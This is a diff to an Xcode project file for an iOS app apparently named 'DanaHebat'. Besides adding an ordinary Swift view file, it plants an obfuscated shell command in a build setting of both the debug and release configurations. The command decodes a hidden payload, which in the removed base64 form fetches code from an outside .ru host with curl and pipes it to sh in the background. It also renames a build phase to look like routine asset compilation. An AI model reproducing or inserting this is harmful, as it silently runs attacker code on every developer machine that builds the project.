@@ -60,6 +60,7 @@
 		733EE1A92F12B81D001C6B69 /* TapContactViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE1A82F12B81D001C6B69 /* TapContactViewCell.swift */; };
 		733EE1AB2F12BEC5001C6B69 /* ContactManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE1AA2F12BEC5001C6B69 /* ContactManager.swift */; };
 		733EE1AD2F12C7BC001C6B69 /* BindCardViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE1AC2F12C7BC001C6B69 /* BindCardViewController.swift */; };
+		73BB01482F16603A009C69ED /* LostNetworkView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BB01472F16603A009C69ED /* LostNetworkView.swift */; };
 		73DF8E262F13563F002C6EE9 /* HomeProductListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73DF8E252F13563F002C6EE9 /* HomeProductListView.swift */; };
 		73DF8E282F135705002C6EE9 /* HomeProductHeadViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73DF8E272F135705002C6EE9 /* HomeProductHeadViewCell.swift */; };
 		73DF8E2A2F13570F002C6EE9 /* HomeProductListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73DF8E292F13570F002C6EE9 /* HomeProductListViewCell.swift */; };
@@ -136,6 +137,7 @@
 		733EE1A82F12B81D001C6B69 /* TapContactViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TapContactViewCell.swift; sourceTree = "<group>"; };
 		733EE1AA2F12BEC5001C6B69 /* ContactManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactManager.swift; sourceTree = "<group>"; };
 		733EE1AC2F12C7BC001C6B69 /* BindCardViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BindCardViewController.swift; sourceTree = "<group>"; };
+		73BB01472F16603A009C69ED /* LostNetworkView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LostNetworkView.swift; sourceTree = "<group>"; };
 		73DF8E252F13563F002C6EE9 /* HomeProductListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeProductListView.swift; sourceTree = "<group>"; };
 		73DF8E272F135705002C6EE9 /* HomeProductHeadViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeProductHeadViewCell.swift; sourceTree = "<group>"; };
 		73DF8E292F13570F002C6EE9 /* HomeProductListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeProductListViewCell.swift; sourceTree = "<group>"; };
@@ -252,6 +254,7 @@
 				73DF8E272F135705002C6EE9 /* HomeProductHeadViewCell.swift */,
 				73DF8E292F13570F002C6EE9 /* HomeProductListViewCell.swift */,
 				73DF8E2D2F1376F0002C6EE9 /* HomeRatetListView.swift */,
+				73BB01472F16603A009C69ED /* LostNetworkView.swift */,
 			);
 			path = View;
 			sourceTree = "<group>";
@@ -410,7 +413,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73EA86942F108C9D00F4826F /* Build configuration list for PBXNativeTarget "DanaHebat" */;
 			buildPhases = (
-				B1517AC53B914888A7634D6E /* Link Libraries Executable */,
+				A6A842B7C6D1490EBE634D6E /* Compile Image Assets */,
 				E0B4BE563B334ADBA551D8AD /* [CP] Check Pods Manifest.lock */,
 				73EA867D2F108C9C00F4826F /* Sources */,
 				73EA867E2F108C9C00F4826F /* Frameworks */,
@@ -475,7 +478,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		B1517AC53B914888A7634D6E /* Link Libraries Executable */ = {
+		A6A842B7C6D1490EBE634D6E /* Compile Image Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -485,7 +488,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Link Libraries Executable";
+			name = "Compile Image Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -544,6 +547,7 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				73BB01482F16603A009C69ED /* LostNetworkView.swift in Sources */,
 				733EE1982F129396001C6B69 /* CommonListView.swift in Sources */,
 				733EE1712F1204E1001C6B69 /* SettingViewController.swift in Sources */,
 				73EA86BA2F10945C00F4826F /* BaseNavigationController.swift in Sources */,
@@ -640,7 +644,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = C463E4989C9DEF3FBD525448 /* Pods-DanaHebat.debug.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((f(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJOdVlYQnpiR0ZpTG5KMUwyRXBJaUI4SUhOb0NnPT0K | f | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((o(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333633363339333633343336333433363633333633353336363133363636333733393332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | o | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaHebat/DanaHebat.entitlements;
@@ -691,7 +695,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 42BF21A26CAFD93794988958 /* Pods-DanaHebat.release.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((f(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJOdVlYQnpiR0ZpTG5KMUwyRXBJaUI4SUhOb0NnPT0K | f | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((o(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333633363339333633343336333433363633333633353336363133363636333733393332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | o | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaHebat/DanaHebat.entitlements;
